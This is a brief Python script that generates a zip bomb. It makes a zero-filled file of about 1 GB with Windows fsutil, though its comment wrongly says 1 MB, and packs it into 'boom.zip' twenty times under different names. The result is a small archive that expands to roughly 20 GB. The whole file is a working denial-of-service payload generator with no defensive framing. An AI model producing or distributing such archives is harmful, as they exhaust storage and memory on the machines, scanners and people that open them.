import os
import zipfile


# Construct the useless file with CMD (Valid only for win10). Size = 1 MB
def construct_useless_file(name):
    os.system(f'fsutil file createnew {name} 1048576000')


# Change the name of the file
def change_name(pre, cur):
    os.rename(pre, cur)


# Add file to zip
def compress_file(f, file_name):
    f.write(file_name)


# Read the file with byte mode
def read_file(name):
    with open(name, 'rb') as f:
        print(f.readline())


if __name__ == '__main__':
    ind = 0
    com_name = 'boom.zip'
    construct_useless_file(f'{ind}.txt')
    f = zipfile.ZipFile(com_name, 'a', zipfile.ZIP_DEFLATED)
    while True:
        if ind == 20:
            break
        compress_file(f, f'{ind}.txt')
        change_name(f'{ind}.txt', f'{ind+1}.txt')
        ind += 1
    f.close()
    os.remove(f'{ind}.txt')
